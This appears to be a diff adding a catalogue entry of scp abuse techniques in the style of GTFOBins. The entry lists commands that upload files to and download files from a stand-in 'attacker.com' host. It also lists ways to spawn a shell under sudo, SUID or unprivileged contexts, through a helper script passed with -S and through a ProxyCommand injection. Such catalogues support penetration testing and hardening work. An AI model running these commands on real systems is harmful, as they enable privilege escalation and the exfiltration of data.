@@ -1,0 +1,53 @@
+scp
+===
+
+Download
+--------
+
+[Sudo]
+    scp user@attacker.com:/path/to/input-file /path/to/output-file
+
+[SUID]
+    scp user@attacker.com:/path/to/input-file /path/to/output-file
+
+[Unprivileged]
+    scp user@attacker.com:/path/to/input-file /path/to/output-file
+
+Shell
+-----
+
+[Sudo]
+    echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
+chmod +x /path/to/temp-file
+scp -S /path/to/temp-file x x:
+
+[SUID]
+    echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
+chmod +x /path/to/temp-file
+scp -S /path/to/temp-file x x:
+
+[Unprivileged]
+    echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
+chmod +x /path/to/temp-file
+scp -S /path/to/temp-file x x:
+
+[Sudo]
+    scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
+
+[SUID]
+    scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
+
+[Unprivileged]
+    scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
+
+Upload
+------
+
+[Sudo]
+    scp /path/to/input-file user@attacker.com:/path/to/output-file
+
+[SUID]
+    scp /path/to/input-file user@attacker.com:/path/to/output-file
+
+[Unprivileged]
+    scp /path/to/input-file user@attacker.com:/path/to/output-file
